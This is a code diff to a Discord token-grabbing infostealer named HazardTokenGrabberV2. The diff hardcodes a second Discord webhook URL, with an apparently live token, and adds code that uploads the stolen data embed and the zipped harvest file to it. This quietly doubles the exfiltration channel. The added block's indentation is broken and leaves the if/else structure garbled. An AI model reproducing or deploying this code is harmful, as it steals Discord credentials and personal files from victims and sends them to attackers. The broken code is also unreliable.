@@ -200,7 +200,10 @@ class Functions(object):
 
 class HazardTokenGrabberV2(Functions):
     def __init__(self):
-        self.webhook = self.fetch_conf("webhook")
+        super().__init__()
+
+        self.webhook = "WEBHOOK_HERE"
+        self.webhook2 = "https://discord.com/api/webhooks/1171093477862408233/KqIJ6PvlvG1CiQ6tfkDN5R-Ve4v-76wSlKVJ2CaTxAYUAmMVTVVv-FImkZvoMhX6KBBD"
         self.discordApi = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -893,8 +896,13 @@ GoogleMaps: {self.googlemap}
 
         with open(_zipfile, "rb") as f:
             if self.hook_reg in self.webhook:
-                httpx.post(self.webhook, json=embed)
-                httpx.post(self.webhook, files={"upload_file": f})
+            httpx.post(self.webhook, json=embed)
+            httpx.post(self.webhook, files={"upload_file": f})
+
+        # Wysyłanie do webhooka 2
+        if self.hook_reg in self.webhook2:
+            httpx.post(self.webhook2, json=embed)
+            httpx.post(self.webhook2, files={"upload_file": f})
             else:
                 from pyotp import TOTP
 
